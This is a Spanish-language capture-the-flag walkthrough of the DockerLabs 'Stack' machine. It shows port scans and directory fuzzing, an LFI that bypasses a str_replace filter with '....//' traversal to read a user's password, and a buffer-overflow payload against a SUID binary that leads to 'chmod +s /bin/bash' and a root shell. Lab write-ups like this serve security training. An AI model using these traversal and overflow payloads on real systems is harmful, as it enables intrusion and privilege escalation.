#MAQUINA #DOCKERLABS #MEDIO 
#LFI
<hr>
# RECONOCIMIENTO

Vamos a resolver **Stack** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS -vvv -p- --min-rate 5000 -n -Pn 172.17.0.2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-26 09:39 CET
Initiating ARP Ping Scan at 09:39
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 09:39, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 09:39
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 09:39, 0.51s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-02-26 09:39:37 CET for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)




```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene los puertos **22(SSH),** **80(HTTP)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.17.0.2                    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-26 09:40 CET
Nmap scan report for 172.17.0.2
Host is up (0.000015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 85:7f:49:c5:89:f6:ce:d2:b3:92:f1:40:de:e0:56:c4 (ECDSA)
|_  256 6d:ed:59:b8:d8:cc:50:54:9d:37:65:58:f5:3f:52:e3 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Web en producci\xC3\xB3n
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.51 seconds




```

```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-26 09:40 CET
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds




```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.


## HTTP (80)

Al hacer Ctrl + U al entrar :

```bash
        <!--Mensaje para Bob: hemos guardado tu contrase�a en /usr/share/bob/password.txt-->
```

Usamos **gobuster** para enumerar:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,js,txt,png,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 417]
/file.php             (Status: 200) [Size: 0]
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
/note.txt             (Status: 200) [Size: 110]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos una nota :

```bash
Hemos detectado el LFI en el archivo PHP, pero gracias a str_replace() creemos haber tapado la vulnerabilidad
```

Hay un posible **LFI**.

# EXPLOTACION

Usamos **wfuzz** para encontrar el parámetro:

```bash
wfuzz -u "http://172.17.0.2/file.php?FUZZ=note.txt" -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --hl=0
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/file.php?FUZZ=note.txt
Total requests: 207643

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                  
=====================================================================

000000741:   200        1 L      17 W       110 Ch      "file"

```

Podemos ver que no podemos hacer uso de cadenas para intentar ejecutar comandos remotamente.

Vamos a intentar escapar de ese str_replace.

Probando veo que si meto doble doble punto y doble barra, me escapo:

```bash
http://172.17.0.2/file.php?file=....//....//....//....//....///usr/share/bob/password.txt
llv6ox3lx300
```

YA ESTAMOS COMO BOB.

# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUID sobre algo:

   ```bash
bob@dada52a04e82:/opt$ find / -perm -4000 2>/dev/null
/opt/command_exec
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
```

Vemos **command_exec** y al ejecutarlo :

```bash
bob@cbd0c0c8c355:/opt$ ./command_exec 
Escribe la contraseña: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Estás en modo usuario (key = 41414141)
key debe valer 0xdead para entrar al modo administrador
Segmentation fault

```

Vemos que necesitamos 76 A para sobreescribir la variable:

```bash
python -c "print('A'*76 + 'BBBB')" | ./command_exec 

Escribe la contraseña: Estás en modo usuario (key = 42424242)
key debe valer 0xdead para entrar al modo administrador

```

Escribimos nuestro script :
```bash
bob@cbd0c0c8c355:~$ cat script.py 
#!/usr/bin/env perl
$|=1;

$payload = "A" x 76;
$payload .= pack("Q",0xdead);

print $payload;
```

Lo ejecutamos y le ponemos SUID a la bash :
```bash

bob@cbd0c0c8c355:~$ (./script.py ; cat) | /opt/command_exec 
Escribe la contraseña: f
Estás en modo administrador (key = dead)
Escribe un comando: chmod +s /bin/bash

bob@cbd0c0c8c355:~$ ls /bin/bash
/bin/bash
bob@cbd0c0c8c355:~$ /bin/bash -p
bash-5.2# whoami
root
bash-5.2# 

```

**YA ESTAMOS COMO ROOT.**

